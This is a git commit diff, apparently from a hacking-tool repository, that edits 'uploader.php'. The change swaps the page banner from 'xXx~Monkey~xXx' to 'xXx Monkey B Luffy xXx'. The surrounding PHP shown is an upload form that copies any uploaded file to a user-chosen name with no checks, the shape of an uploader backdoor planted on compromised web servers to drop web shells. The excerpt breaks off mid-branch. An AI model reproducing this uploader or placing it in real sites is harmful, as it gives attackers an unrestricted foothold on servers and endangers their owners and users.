a63fd4d0bb80fec33ecec1f8c9959dffe7b3cd18
florienzh4x <hasanal.bulkiah501@gmail.com>
2019-01-07 17:05:05 +0700

    Update uploader.php

--- uploader.php
+++ uploader.php
@@ -1,5 +1,5 @@
 <?php  
-echo "<center><h1>xXx~Monkey~xXx</h1><br><br><form method='post' enctype='multipart/form-data'><input type='file' name='file'><input type='submit' name='upload' value='Upload!'></form>"; 
+echo "<center><h1>xXx Monkey B Luffy xXx</h1><br><br><form method='post' enctype='multipart/form-data'><input type='file' name='file'><input type='submit' name='upload' value='Upload!'></form>"; 
 $files = $_FILES['file']['name']; 
 if(isset($_POST['upload'])) { 
  if(@copy($_FILES['file']['tmp_name'], $files)) { 
